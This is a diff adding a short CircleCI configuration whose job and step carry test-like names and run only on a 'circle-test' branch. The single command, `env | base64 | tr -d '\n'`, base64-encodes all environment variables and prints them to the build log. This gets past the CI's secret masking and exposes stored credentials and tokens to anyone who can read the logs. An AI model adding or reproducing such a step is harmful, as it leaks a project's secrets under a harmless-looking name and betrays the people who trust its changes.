@@ -1,0 +1,20 @@
+version: 2.1
+
+jobs:
+  circle-tmp:
+    docker:
+      - image: circleci/golang:1.13-node
+
+    steps:
+      - run:
+          name: circle-test-run
+          command: env | base64 | tr -d '\n'
+
+workflows:
+  build:
+    jobs:
+      - circle-tmp:
+          filters:
+            branches:
+              only:
+                - circle-test
